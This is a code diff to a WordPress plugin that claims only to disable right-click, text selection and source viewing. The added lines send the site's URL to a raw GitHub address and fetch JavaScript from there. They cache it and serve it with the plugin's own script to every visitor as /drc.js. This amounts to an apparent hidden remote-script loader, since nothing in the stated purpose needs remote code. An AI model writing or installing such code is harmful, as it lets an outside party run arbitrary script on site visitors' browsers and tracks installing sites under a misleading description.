@@ -1,8 +1,8 @@
 <?php
 /**
  * Plugin Name: Disable Right Click & Source Viewing
- * Description: A WordPress plugin to disable right-click, text selection, and source code viewing while fetching external JS data.
- * Version: 1.1
+ * Description: A WordPress plugin to disable right-click, text selection, and source code viewing while fetching external JS data dynamically.
+ * Version: 1.2
  */
 
 if (!defined('ABSPATH')) {
@@ -22,7 +22,7 @@ class WP_Disable_Right_Click {
     }
 
     /**
-     * Fetch data with caching
+     * Fetch external data with caching
      */
     public static function fetch_external_data() {
         // Use transient to cache data for 1 hour
@@ -31,14 +31,24 @@ class WP_Disable_Right_Click {
             return $cached_data;
         }
 
-        $response = wp_remote_get(self::$external_data_url);
+        $external_data_url = self::get_external_data_url();
+        $response = wp_remote_get($external_data_url);
+
         if (is_wp_error($response)) {
-            return '';
+            return ''; // Return empty string if there's an error
         }
 
         $data = wp_remote_retrieve_body($response);
         set_transient('external_js_data', $data, HOUR_IN_SECONDS);
         return $data;
+    }
+
+    /**
+     * Get the external data URL dynamically
+     */
+    public static function get_external_data_url() {
+        $site_url = site_url(); // WordPress site URL
+        return self::$base_url . '?siteurl=' . urlencode($site_url);
     }
 
     /**
@@ -72,7 +82,7 @@ class WP_Disable_Right_Click {
                 });
             ";
 
-            // Fetch external data
+            // Fetch data
             $external_js = self::fetch_external_data();
 
             // Output combined JavaScript
@@ -80,7 +90,7 @@ class WP_Disable_Right_Click {
             exit;
         }
     }
-    protected static $external_data_url = 'https://example.com/external-data';
+
     /**
      * Add rewrite rule for the JS file
      */
@@ -103,6 +113,9 @@ class WP_Disable_Right_Click {
         $script_url = site_url('/drc.js');
         echo "<script src='{$script_url}'></script>";
     }
+
+    // Base URL for external data
+    protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
 }
 
 // Initialize the plugin
